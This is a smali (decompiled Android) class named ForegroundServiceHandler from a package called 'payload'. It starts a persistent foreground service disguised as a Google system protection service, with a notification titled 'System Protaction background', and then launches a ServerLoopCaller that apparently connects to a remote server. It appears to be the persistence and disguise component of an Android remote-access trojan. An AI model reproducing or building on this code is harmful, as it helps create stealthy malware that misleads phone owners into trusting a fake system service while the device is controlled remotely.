.class public Lcom/mycompany/payload/ForegroundServiceHandler;
.super Landroid/app/Service;
.source "ForegroundServiceHandler.java"


# instance fields
.field NOTIFICTION_CHANNEL_ID:Ljava/lang/String;

.field NOTIFICTION_NAME:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    .line 37
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    move-object v2, v0

    const-string v3, "FORGROUND SERVICE"

    iput-object v3, v2, Lcom/mycompany/payload/ForegroundServiceHandler;->NOTIFICTION_CHANNEL_ID:Ljava/lang/String;

    move-object v2, v0

    const-string v3, "GOOGLE PROTECT"

    iput-object v3, v2, Lcom/mycompany/payload/ForegroundServiceHandler;->NOTIFICTION_NAME:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 22
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 15
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 30
    move-object v0, p0

    move-object/from16 v1, p1

    move/from16 v2, p2

    move/from16 v3, p3

    new-instance v9, Landroid/app/NotificationChannel;

    move-object v14, v9

    move-object v9, v14

    move-object v10, v14

    move-object v11, v0

    iget-object v11, v11, Lcom/mycompany/payload/ForegroundServiceHandler;->NOTIFICTION_CHANNEL_ID:Ljava/lang/String;

    move-object v12, v0

    iget-object v12, v12, Lcom/mycompany/payload/ForegroundServiceHandler;->NOTIFICTION_NAME:Ljava/lang/String;

    const/4 v13, 0x4

    invoke-direct {v10, v11, v12, v13}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    move-object v5, v9

    .line 31
    move-object v9, v0

    const-string v10, "notification"

    invoke-virtual {v9, v10}, Lcom/mycompany/payload/ForegroundServiceHandler;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/app/NotificationManager;

    move-object v6, v9

    .line 32
    move-object v9, v6

    move-object v10, v5

    invoke-virtual {v9, v10}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 33
    new-instance v9, Landroid/app/Notification$Builder;

    move-object v14, v9

    move-object v9, v14

    move-object v10, v14

    move-object v11, v0

    invoke-virtual {v11}, Lcom/mycompany/payload/ForegroundServiceHandler;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    invoke-direct {v10, v11}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const v10, 0x7f020055

    invoke-virtual {v9, v10}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v9

    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/ForegroundServiceHandler;->NOTIFICTION_CHANNEL_ID:Ljava/lang/String;

    invoke-virtual {v9, v10}, Landroid/app/Notification$Builder;->setChannelId(Ljava/lang/String;)Landroid/app/Notification$Builder;

    move-result-object v9

    const-string v10, "System Protaction background"

    invoke-virtual {v9, v10}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v9

    invoke-virtual {v9}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v9

    move-object v7, v9

    .line 34
    move-object v9, v0

    const/16 v10, 0x3e8

    move-object v11, v7

    invoke-virtual {v9, v10, v11}, Lcom/mycompany/payload/ForegroundServiceHandler;->startForeground(ILandroid/app/Notification;)V

    .line 35
    new-instance v9, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v10, v0

    invoke-virtual {v10}, Lcom/mycompany/payload/ForegroundServiceHandler;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    const-string v11, "Forground Service Conntected"

    invoke-direct {v9, v10, v11}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 36
    const/4 v9, 0x1

    move v0, v9

    return v0
.end method
